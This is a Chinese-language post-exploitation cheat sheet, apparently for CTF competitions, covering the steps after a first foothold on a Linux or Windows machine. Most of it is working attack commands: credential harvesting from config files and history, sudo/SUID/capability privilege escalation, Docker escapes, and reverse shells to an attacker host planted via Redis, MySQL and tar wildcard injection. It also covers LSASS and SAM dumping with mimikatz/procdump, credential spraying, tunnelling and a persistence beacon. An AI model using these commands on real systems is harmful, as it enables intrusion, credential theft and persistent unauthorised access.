# 拿下第一台机器后行动速查表

> 拿到的可能只是低权限（www-data/普通用户），不是root。核心原则：**身份 → 凭据 → 判断能否白嫖横向 → 提权（如果必须）→ Pivot进内网**。凭据收集的性价比通常高于提权，别一上来就冲提权脚本。

## 快速路径

1. `whoami`、`id`、网卡、路由、容器环境。
2. 先找凭据：配置文件、历史记录、SSH Key、数据库密码、环境变量。
3. 判断能否直接复用凭据横向。
4. 必须提权时，再按 Linux/Windows 清单逐项检查。
5. 建立隧道，扫描下一网段，记录新目标与新凭据。
---

## Step 0：第一分钟——环境识别

### 0.1 基本身份与网络

```bash
whoami; id
hostname
uname -a
cat /etc/os-release 2>/dev/null || cat /etc/issue

ip addr `有没有第二块网卡（是否是DMZ跳板）`
ip route `有没有内网路由`
cat /etc/hosts `有没有内部域名（`xxx.internal`）`
ss -lntp `本机还跑着什么服务，是否有别的攻击面
netstat -antp 2>/dev/null  
arp -a `本地网段里已经"聊过天"的内网邻居，免费的内网线索`
```

| 命令 | 要判断什么 |
|---|---|
| `ip addr` | 有没有第二块网卡（是否是DMZ跳板）|
| `ip route` | 有没有内网路由 |
| `/etc/hosts` | 有没有内部域名（`xxx.internal`）|
| `ss -lntp` | 本机还跑着什么服务，是否有别的攻击面 |
| `arp -a` | 本地网段里已经"聊过天"的内网邻居，免费的内网线索 |
| `uname -a` | 内核版本，判断是否有对应内核提权漏洞 |

### 0.2 判断自己是不是在容器里

**这一步经常被漏掉，但会影响你后续所有判断——容器里的"root"和物理机的root价值完全不同。**

```bash
# 是否在容器内
cat /proc/1/cgroup 2>/dev/null | grep -iE "docker|kube|lxc"
ls -la / | grep -i dockerenv
cat /proc/self/mountinfo | grep -i overlay

# 容器内当前权限（Capabilities）
cat /proc/self/status | grep Cap
capsh --print 2>/dev/null

# 是否挂载了敏感目录/socket
mount | grep -E "docker.sock|/var/run"
ls -la /var/run/docker.sock 2>/dev/null
```

> 如果`/var/run/docker.sock`存在且可写，等价于拿到了宿主机权限（后面Step 3.7有具体逃逸方式）。如果容器以`--privileged`启动（`capsh --print`里能力全开），同样可以直接逃逸。

### 0.3 进程与服务反推技术栈

```bash
ps aux
ps -ef --forest    # 看进程父子关系，判断Web服务由谁拉起
lsof -i 2>/dev/null
cat /proc/net/tcp   # 没有lsof/netstat权限时的备选方案
```

> 看到`php-fpm`/`node`/`java`/`gunicorn`/`uwsgi`这类进程，直接反推对应框架的配置文件路径（见Step 1.2大表），比盲目`find`快得多。

## Step 1：信息收集优先于提权

### 1.1 通用凭据搜索——覆盖面要广

```bash
# 关键词搜索（限定常见文本文件，避免搜二进制卡死）
grep -RniE 'password|passwd|secret|token|apikey|api_key|access_key|private_key' \
  --include="*.php" --include="*.py" --include="*.js" --include="*.json" \
  --include="*.yml" --include="*.yaml" --include="*.xml" --include="*.ini" \
  --include="*.conf" --include="*.env" --include="*.properties" \
  / 2>/dev/null | grep -v "Binary file"

# 常见配置文件名直接定位
find / -maxdepth 6 \( -iname "*.env" -o -iname "config.php" -o -iname "settings.py" \
  -o -iname "application.yml" -o -iname "application.properties" -o -iname "web.config" \
  -o -iname "wp-config.php" -o -iname "database.yml" \) 2>/dev/null

# 隐藏文件/编辑器备份文件（开发者忘记删的临时文件，价值很高）
find / -name ".*.swp" -o -name "*~" -o -name "*.bak" -o -name "*.orig" 2>/dev/null
find / -name "*.git" -maxdepth 6 -type d 2>/dev/null   # 本机是否也有.git目录残留

# SUID/SGID遗留的核心转储文件（有时会含内存中的密码）
find / -name "core" -o -name "*.dump" 2>/dev/null
```

### 1.2 按技术栈定位配置文件——这是最容易漏掉、但命中率最高的一步

不要只搜"config"这种通用词，**按识别出的技术栈直接定位对应的默认配置路径**：

| 技术栈 | 常见配置文件路径 |
|---|---|
| PHP通用 | `/var/www/html/.env`、`/var/www/html/config.php`、`/var/www/html/wp-config.php`（WordPress）|
| Laravel | `.env`（数据库、Redis、邮件、第三方API key全在这）|
| ThinkPHP | `application/database.php`、`config/database.php` |
| Django | `settings.py`（`SECRET_KEY`、`DATABASES`字典）|
| Flask | `config.py`、环境变量`FLASK_*` |
| Spring Boot | `application.yml`/`application.properties`（`spring.datasource.password`）|
| Node.js/Express | `.env`、`config/default.json`、`ecosystem.config.js`（PM2配置）|
| .NET | `web.config`（`connectionStrings`节点）、`appsettings.json` |
| Docker Compose | `docker-compose.yml`（环境变量里常直接写数据库密码）|
| Nginx | `/etc/nginx/sites-enabled/*`（反查内部服务地址、上游代理）|
| Apache | `/etc/apache2/sites-enabled/*`、`.htpasswd` |
| 数据库自身 | MySQL: `/etc/mysql/debian.cnf`（Debian系默认含root密码！）|

```bash
# Debian/Ubuntu特有：几乎必查
cat /etc/mysql/debian.cnf 2>/dev/null
```

### 1.3 用户与权限相关文件

```bash
# 有登录shell的用户（排除系统账号噪音）
grep -E "/bin/(ba)?sh$" /etc/passwd

# sudoers（若可读）
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# 历史命令——不只看自己的，其他能读到的都看
cat ~/.bash_history
cat ~/.zsh_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null    # 曾经手动连过MySQL会留下明文密码！
find /home -name "*_history" -readable 2>/dev/null

# SSH相关
ls -la ~/.ssh/
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/id_ed25519 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null   # 泄露内网其他主机IP

# 环境变量、进程环境
env
for p in /proc/[0-9]*; do cat $p/environ 2>/dev/null | tr '\0' '\n'; done 2>/dev/null
```

> **`~/.mysql_history`极容易被忽略**——如果管理员曾经手动登录过MySQL，这个文件会以明文保存过去执行的每一条SQL语句，包括建号时用的密码。

### 1.4 拿到数据库凭据之后，别只看一张表

```bash
mysql -h 127.0.0.1 -u <user> -p<password>
```
```sql
SHOW DATABASES;
-- 挨个看有没有用户表
SELECT table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%';
SELECT * FROM users LIMIT 20;
-- 数据库自身的账号列表（可能有另一套凭据）
SELECT user, host, authentication_string FROM mysql.user;
```

> 数据库里经常还藏着**另一个系统的账号**（比如OA系统的用户表），这组凭据可能才是通向第二层的钥匙。

### 1.5 凭据价值优先级总表

| 优先级 | 目标 | 原因 |
|---|---|---|
| ★★★★★ | `.env`/框架配置文件 | 直接给数据库/Redis/第三方凭据，命中率最高 |
| ★★★★★ | `~/.ssh/id_rsa`（若可读）| 直接免密登录，无需破解 |
| ★★★★★ | `/etc/mysql/debian.cnf` | Debian系统默认存在，常被忽略 |
| ★★★★☆ | `~/.mysql_history`、`.bash_history` | 明文密码残留 |
| ★★★★☆ | 数据库业务表里的账号密码 | 可能是其他系统的凭据 |
| ★★★☆☆ | 其他用户`/home`目录 | 个人脚本/配置里常有硬编码密码 |
| ★★★☆☆ | 定时任务脚本内容 | 脚本里常直接写连接凭据 |
| ★★☆☆☆ | `known_hosts` | 不是凭据本身，但暴露内网其他主机IP |

## Step 2：判断有没有"免费的下一跳"（横向优先于提权）

拿到任何一组凭据，先别急着验证它在"本机能不能提权"，先问：

- [ ] 这个密码会不会是**系统用户密码**（复用）？→ 试试 `su <user>`
- [ ] 会不会是**SSH密码**？→ 试试对内网其他机器 `ssh <user>@<内网IP>`
- [ ] `/etc/hosts`里有没有值得访问的内部域名？
- [ ] `ip route`有没有内网网段？该网段里有什么服务？
- [ ] `known_hosts`里有没有别的主机IP，值得先试试同一凭据？

```bash
# 快速判断内网网段
ip route | grep -v default

# 没有nmap时的手工存活探测
for ip in 10.10.10.{1..254}; do
  timeout 0.5 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null && echo "$ip:22 open"
done

# 批量测一组凭据对多个主机（有工具时）
crackmapexec ssh 10.10.10.0/24 -u <user> -p '<password>'
crackmapexec smb 10.10.10.0/24 -u <user> -p '<password>'

# 没有crackmapexec时的手工循环
for ip in 10.10.10.20 10.10.10.30 10.10.10.40; do
  sshpass -p '<password>' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no <user>@$ip whoami
done
```

> **心态：** 很多时候提权不是必答题，凭据复用横向反而是更快的路径——尤其是断网环境下，试密码几乎零成本，值得优先尝试，而不是先花二十分钟死磕本地提权。

## Step 3：如果必须提权——Linux完整检查顺序

### 3.1 sudo权限（最常见、命中率最高）

```bash
sudo -l
```

拿到结果后，去 **GTFOBins**（赛前离线保存一份 https://gtfobins.github.io/ ）按命中的二进制名字查对应的sudo利用方式，例如：

```bash
# 如果sudo -l显示可以免密执行 vim
sudo vim -c ':!/bin/sh'

# 如果是 find
sudo find . -exec /bin/sh \; -quit

# 如果是 python
sudo python3 -c 'import os; os.system("/bin/sh")'
```

> 不需要死记每个二进制的利用方式，现场查GTFOBins比背下来更可靠。

### 3.2 SUID/SGID程序

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
同样对照GTFOBins查找命中的二进制。**重点关注不常见的SUID程序**（不是`/usr/bin/passwd`这种系统自带的），往往是题目故意留的。

### 3.3 Capabilities（比SUID更容易被忽略）

```bash
getcap -r / 2>/dev/null
```

常见危险能力：
```bash
# cap_setuid：可以直接提权到root
# 如果 python3 有 cap_setuid+ep：
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 3.4 定时任务

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
```

重点排查三类：

| 手法 | 条件 |
|---|---|
| **可写的脚本本身** | 定时任务调用的脚本文件如果当前用户可写，直接改内容插入反弹Shell/加SUID |
| **通配符注入** | 脚本里用了`tar *`、`chmod 777 *`这类通配符，可以在目录下放置特殊命名文件触发参数注入（如`tar`的`--checkpoint-action`利用）|
| **PATH劫持** | 脚本里调用命令没写绝对路径（如直接写`mysqldump`而非`/usr/bin/mysqldump`），且脚本执行时PATH包含当前用户可写目录，可以自己放一个同名恶意程序 |

```bash
# 检查PATH劫持可能性
echo $PATH
find / -writable -type d 2>/dev/null | grep -v "^/tmp\|^/proc"
```

### 3.5 可写文件全局搜索

```bash
find / -writable -type f 2>/dev/null | grep -vE "^/proc|^/tmp|^/dev"
find / -writable -type d 2>/dev/null | grep -vE "^/proc|^/tmp|^/dev"

# 特别关注：谁在以root身份跑，且该脚本/程序你能改
find / -perm -o+w -not -path "/proc/*" -not -path "/tmp/*" 2>/dev/null
```

### 3.6 内核/系统层面

```bash
uname -a
cat /etc/os-release
```

> 断网环境下建议提前准备好常见内核版本对应的提权漏洞清单（版本号+CVE编号对照表），现场判断"值不值得试"，而不是盲目下载exploit——内核exploit失败有直接把系统打崩的风险，CTF环境下要谨慎。

### 3.7 特殊环境：NFS / Docker组

```bash
# NFS no_root_squash 提权判断（如果本机能挂载带这个配置的NFS共享）
cat /etc/exports 2>/dev/null   # 如果自己是NFS服务端
showmount -e <NFS服务器IP>     # 如果要看远程NFS配置

# Docker组提权（用户在docker组，等价于root）
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# docker.sock可写时的逃逸
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

> **`docker`组成员本质等于root**——这是经常被忽略的一条，因为它不需要任何"漏洞"，只是Linux权限模型设计如此。

### 3.8 第三方服务配置错误提权

不是所有提权都靠"漏洞"，很多时候是**本机跑着的服务本身权限配置有问题**：

```bash
# 本机是否跑着以root身份运行的Redis，且可写crontab
ps aux | grep redis
redis-cli -h 127.0.0.1 ping    # 无密码能直接连上就很可疑

# 如果Redis以root运行，可以直接写crontab反弹Shell
redis-cli -h 127.0.0.1
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n* * * * * bash -c 'bash -i >& /dev/tcp/攻击机IP/端口 0>&1'\n"
> save

# MySQL以root运行 + 有FILE权限：同理可以写crontab或SSH key
mysql -u root -p
> SELECT "* * * * * bash -c 'bash -i >& /dev/tcp/攻击机IP/端口 0>&1'"
  INTO OUTFILE '/var/spool/cron/crontabs/root';

# 检查有没有本地监听的、版本古老的管理服务（Webmin/Supervisor等）
ss -lntp | grep -v "127.0.0.1"
```

> **红队心态：** 提权不一定要"打穿"系统，很多时候只是**发现了一个高权限进程留下的可写接口**（Redis/MySQL以root运行、Docker socket可写、可写的systemd单元文件），这类"配置错误型"提权往往比内核exploit更稳、风险更低。

### 3.9 通配符注入（Wildcard Injection）具体示例

Step 3.4提到的通配符注入，很多人知道原理但不知道具体怎么打，这里给个完整示例：

```bash
# 假设发现root的定时任务里有类似这样的脚本（在当前用户可写目录下执行）：
# cd /var/backups && tar -czf backup.tar.gz *

# 利用tar的--checkpoint参数在压缩时触发命令执行：
cd /var/backups
echo 'bash -i >& /dev/tcp/攻击机IP/端口 0>&1' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# 等定时任务下次执行 tar -czf backup.tar.gz * 时，
# 通配符会把上面两个文件名当成tar的参数，从而触发shell.sh执行
```

**其他常见通配符注入命令：** `chown -R user *`（配合`--reference`参数）、`rsync *`（配合`-e`参数指定执行的shell命令）

## Step 4：如果是Windows机器

### 4.1 身份与环境

```powershell
whoami
whoami /priv
whoami /groups
systeminfo
ipconfig /all
route print
```

### 4.2 服务与计划任务

```powershell
sc query
wmic service get name,startname,pathname,startmode

# 服务路径权限检查（Unquoted Service Path / 可写服务二进制）
icacls "C:\Program Files\SomeService\service.exe"

schtasks /query /fo LIST /v
```

### 4.3 常见Windows提权方向

| 方向 | 判断方式 |
|---|---|
| **AlwaysInstallElevated** | 检查注册表`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`和`HKCU`下同名键是否都为1，是则可以用msi包直接提权到SYSTEM |
| **Unquoted Service Path** | 服务路径含空格且未加引号（如`C:\Program Files\My Service\bin.exe`），可在`C:\Program.exe`等位置放置恶意程序抢先加载 |
| **服务二进制/目录可写** | `icacls`检查后，若当前用户对服务对应文件有写权限，直接替换成恶意程序 |
| **Token权限滥用（SeImpersonatePrivilege）** | `whoami /priv`若看到该权限被启用，配合PrintSpoofer/JuicyPotato类工具可提权到SYSTEM（提前离线备好工具）|
| **注册表凭据残留** | 见4.4 |

### 4.4 凭据搜索（Windows特有位置）

```powershell
# 注册表里常见的明文/弱保护凭据
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>nul

# 已保存的Windows凭据
cmdkey /list

# 常见配置文件位置
findstr /si password *.xml *.ini *.txt *.config 2>nul

# Unattend安装残留文件（常含明文密码，老系统多见）
dir /s /b unattend.xml sysprep.inf sysprep.xml 2>nul
```

> 拿到本地管理员权限后，如果需要抓取内存中其他用户的凭据用于横向，思路是用凭据dump工具（如Mimikatz）提取LSASS内存中的哈希/明文——**这类工具需提前离线合法准备，且仅限于比赛授权靶机环境使用**。

### 4.5 拿到本地管理员后——凭据提取具体操作

> 以下操作前提是已经拿到本地管理员/SYSTEM权限，目的是获取更多凭据用于横向到其他机器。

```powershell
# ① 导出SAM/SYSTEM注册表配置单元（离线可破解本地账号哈希）
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
# 拷回攻击机后用 impacket-secretsdump 离线解析：
# impacket-secretsdump -sam sam.save -system system.save LOCAL

# ② LSASS内存dump（含登录过的域用户明文/哈希，价值通常更高）
# 用任务管理器手动dump（图形界面时最简单、最不容易被拦）：
#   任务管理器 → 详细信息 → lsass.exe → 右键 → 创建转储文件
# 命令行方式（需要Mimikatz或procdump等工具，提前离线准备）：
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 拷回攻击机用 mimikatz 或 pypykatz 离线解析：
# pypykatz lsa minidump lsass.dmp

# ③ 直接内存抓取（如果目标机上已放好mimikatz）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# ④ DPAPI保护的浏览器/凭据管理器密码
vaultcmd /list
```

> **红队心态：** SAM只有本地账号哈希，价值有限；**LSASS内存里的域账号凭据才是横向的关键**——如果这台Windows机器曾经有域管理员登录过（哪怕已经注销），LSASS里可能还留着痕迹。断网环境下务必提前把procdump/mimikatz/pypykatz这套工具链打包好，现场没法临时下载。

## Step 5：确认Pivot方案（越早确认越好）

拿到内网线索后，先判断自己手上有什么权限能建隧道：

| 你有什么 | 用什么 |
|---|---|
| SSH账号 | `ssh -L`本地转发 / `ssh -D`建SOCKS |
| 只有WebShell，没有SSH | **reGeorg/neoreg/Suo5**（HTTP隧道）或**chisel**（更通用，Windows目标也能用）|
| 需要持续稳定访问 | **frp**（提前部署frps到攻击机）|
| 目标机没有出网能力，只能反向连 | **chisel反向模式** / **frp反向代理** |

```bash
# 有SSH时：本地端口转发访问内网单个服务
ssh -L 13306:10.10.10.20:3306 user@第一层
mysql -h 127.0.0.1 -P 13306 -u dbuser -p

# 有SSH时：建SOCKS代理访问整个内网
ssh -D 1080 user@第一层
# 配合proxychains（/etc/proxychains.conf里加 socks5 127.0.0.1 1080）
proxychains nmap -sT -p22,80,445,3306 10.10.10.0/24
proxychains mysql -h 10.10.10.20 -u dbuser -p

# 只有WebShell、没有SSH：HTTP隧道
# 1. 上传tunnel.php到目标Web目录
# 2. 攻击机运行客户端建立SOCKS代理
python2 reGeorgSocksProxy.py -u http://目标IP/tunnel.php -p 1080

# chisel（正向，目标能被攻击机直接连接时）
# 目标机（server端）：
./chisel server -p 8000 --reverse
# 攻击机（client端，反向模式更适合断网/防火墙限制场景）：
./chisel client 目标IP:8000 R:1080:socks
```

> **断网赛场关键提醒：** chisel/reGeorg/frp这类工具必须提前下载好放进赛场U盘，现场没法临时从GitHub拉取。不要假设自己一定能拿到SSH账号——WebShell-only是更常见的起点，这类工具准备的优先级不该低于SSH隧道本身。

## Step 6（可选）：权限维持——只在赛制允许/需要重复访问时做

多层靶机里，如果某台机器需要反复回来查资料，简单留个后手比每次重新打一遍漏洞更省时间：

```bash
# 写自己的公钥进authorized_keys（比WebShell更稳，不依赖Web服务存活）
echo "<你的公钥>" >> ~/.ssh/authorized_keys

# 加一条自己的定时任务（谨慎使用，注意不要影响裁判评分环境）
(crontab -l 2>/dev/null; echo "*/10 * * * * curl http://攻击机/beacon") | crontab -
```

> 是否需要权限维持取决于具体赛制——有些比赛按"最终状态"评分，留后门可能不加分甚至扣分，先确认规则再做。

## Step 8：Flag/关键证据定位技巧

CTF场景下，拿到权限后除了继续渗透，也要留意flag本身：

```bash
# 常见flag文件命名与位置，find一遍性价比很高
find / -iname "flag*" 2>/dev/null
find / -iname "*.txt" -newer /etc/hostname 2>/dev/null   # 找比系统安装更新的文本文件，往往是后加的flag
find /root /home -maxdepth 2 -type f 2>/dev/null

# Windows常见位置
dir /s /b C:\flag* 2>nul
dir /s /b C:\Users\*\Desktop\flag* 2>nul
```

**常见flag藏匿位置优先检查顺序：** `/root/`、`/home/<user>/`、Web根目录、`/opt/`、`/flag`、数据库某张表里、环境变量里（`env`）、进程启动参数里（`ps aux`能看到）。

> 有些题目flag不是文件而是某个服务返回的字符串（数据库某表、内部API响应），**别把"提权成功"当成终点**，提权往往只是拿到读flag所需权限的手段。

## Step 9：过程记录规范——多层靶机必须做的事

拿下第一台后信息量会迅速膨胀，没有笔记会导致后面重复劳动、遗忘线索。建议固定格式记录：

```
主机: 10.10.10.20 (web01)
访问方式: WebShell http://10.10.10.20/shell.php (密码: xxx) / SSH user:password
权限: www-data → 已提权至 user（sudo -l 命中 vim）
已获凭据:
  - db_user / xxxxx (来自 /var/www/.env，MySQL已验证有效)
  - ssh_key: /home/user/.ssh/id_rsa（内容已保存到攻击机 ~/loot/web01_id_rsa）
内网线索:
  - 第二网卡 10.10.10.0/24
  - /etc/hosts 中发现 db.internal(10.10.10.30), oa.internal(10.10.10.40)
待办:
  - [ ] 试db_user密码复用到oa.internal
  - [ ] 已知SSH私钥对应用户是否在其他机器有效
```

> **建议习惯：** 每拿到一个新凭据/新线索立刻记一行，不要等"整理完再记"——多层靶机推进到第三、四层时，脑子里同时装五六台机器的信息很容易漏掉已经拿到但没用上的凭据。

## 决策流程图（简化版）

```
拿到Shell
   │
   ▼
是不是在容器里？──是──→ 检查docker.sock/privileged逃逸可能
   │否
   ▼
翻配置/历史命令/SSH key找凭据
   │
   ▼
凭据能不能横向复用？──能──→ 直接横向到下一台，跳过本机提权
   │不能 / 没有可横向目标
   ▼
sudo -l / SUID / capabilities 有命中？──有──→ 查GTFOBins直接提权
   │没有
   ▼
cron可写 / 第三方服务配置错误 / docker组？──有──→ 对应手法提权
   │没有
   ▼
内核exploit（谨慎评估风险后再用）
   │
   ▼
拿到更高权限 / 新凭据 → 回到"翻配置找凭据"循环，直到能Pivot进内网
```

## 一页纸顺序总览

```
① whoami / id / ip addr / ip route / /etc/hosts / 容器判断      —— 我是谁，在哪
② 按技术栈定位配置文件 / 历史命令 / SSH key / .mysql_history    —— 找凭据（优先于提权）
③ 凭据能不能白嫖横向（su / ssh复用 / 批量测内网主机）           —— 判断免费下一跳
④ sudo -l / SUID / capabilities / cron / 第三方服务 / docker组  —— 需要时再提权（查GTFOBins）
⑤ 确认Pivot方式（SSH隧道 or WebShell隧道工具）                  —— 为内网访问做准备
⑥（可选）留个访问后手                                           —— 视赛制而定
⑦ 顺手find一遍flag常见位置                                      —— 别漏掉唾手可得的分
⑧ 记录凭据/线索到笔记                                           —— 每拿到就记，不要攒着
⑨ 拿到内网线索 → 进入"第二层"流程
```

> 核心逻辑：**身份 → 凭据 → 横向可行性 → 提权 → Pivot**。凭据收集的性价比通常远高于提权，提权是"手段"不是"目标"——目标永远是往内网深处走，或者拿到下一段凭据。
